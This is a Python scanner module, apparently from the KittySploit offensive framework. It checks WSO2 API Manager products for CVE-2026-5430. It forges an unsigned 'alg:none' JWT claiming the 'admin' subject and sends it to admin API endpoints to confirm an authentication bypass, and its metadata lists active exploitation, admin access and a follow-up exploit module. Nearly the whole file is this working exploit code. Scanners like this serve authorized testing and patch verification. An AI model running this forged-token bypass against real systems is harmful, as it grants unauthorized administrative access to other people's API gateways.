#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect WSO2 CVE-2026-5430 JWT unsupported-algorithm authentication bypass."""

import base64
import json
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "WSO2 CVE-2026-5430 JWT Auth Bypass Detect",
        "description": (
            "Detects CVE-2026-5430 in WSO2 API Manager / Control Plane / Traffic Manager / "
            "Universal Gateway: JWTUtil accepts tokens whose alg header is outside the "
            "supported RS256/384/512 set. Probes admin APIs with an alg:none X-JWT-Assertion."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-5430"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-5430",
            "https://github.com/advisories/GHSA-j7vh-5w8q-4m4x",
            "https://security.docs.wso2.com/en/latest/security-announcements/WSO2-2026-5328/",
        ],
        "modules": ["auxiliary/admin/http/wso2_cve_2026_5430_jwt_bypass"],
        "tags": [
            "web",
            "scanner",
            "wso2",
            "jwt",
            "auth-bypass",
            "admin",
            "cve-2026-5430",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.35,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["wso2"],
                "endpoint_pattern_any": ["/api/am/admin/", "/services/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "JWT alg confusion"},
                    {"capability": "admin_access", "from_detail": "admin API scope"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/wso2_cve_2026_5430_jwt_bypass",
                ],
            },
        },
    }

    admin_path = OptString(
        "/api/am/admin/v4/applications",
        "Admin API path to probe with forged JWT",
        False,
        advanced=True,
    )

    @staticmethod
    def _forge_none_jwt(subject: str = "admin") -> str:
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()
        ).decode().rstrip("=")
        payload = base64.urlsafe_b64encode(
            json.dumps(
                {
                    "sub": subject,
                    "iss": "wso2.org/products/am",
                    "exp": int(time.time()) + 3600,
                },
                separators=(",", ":"),
            ).encode()
        ).decode().rstrip("=")
        return f"{header}.{payload}."

    def _probe(self, path: str, token: str):
        headers = {"X-JWT-Assertion": token, "Accept": "application/json"}
        return self.http_request(
            method="GET",
            path=path,
            headers=headers,
            allow_redirects=False,
        )

    def run(self):
        version = self.http_request(method="GET", path="/services/Version", allow_redirects=False)
        body = (version.text or "") if version else ""
        if "wso2" not in body.lower() and int(version.status_code or 0) != 200:
            publisher = self.http_request(method="GET", path="/publisher", allow_redirects=False)
            pub_body = (publisher.text or "") if publisher else ""
            if "wso2" not in pub_body.lower():
                return False

        token = self._forge_none_jwt()
        admin_path = str(self.admin_path or "/api/am/admin/v4/applications")
        response = self._probe(admin_path, token)
        if not response:
            response = self._probe("/services/admin", token)
            admin_path = "/services/admin"
        if not response:
            return False

        code = int(response.status_code or 0)
        text = response.text or ""
        if code in (200, 201) and ("application" in text.lower() or "list" in text.lower() or "count" in text.lower()):
            self.set_info(
                severity="critical",
                cve="CVE-2026-5430",
                reason="Admin API accepted alg:none JWT via X-JWT-Assertion",
                path=admin_path,
            )
            return True
        if code == 200 and text.strip().startswith("{"):
            self.set_info(
                severity="critical",
                cve="CVE-2026-5430",
                reason="Admin API returned JSON for forged alg:none JWT",
                path=admin_path,
            )
            return True
        return False
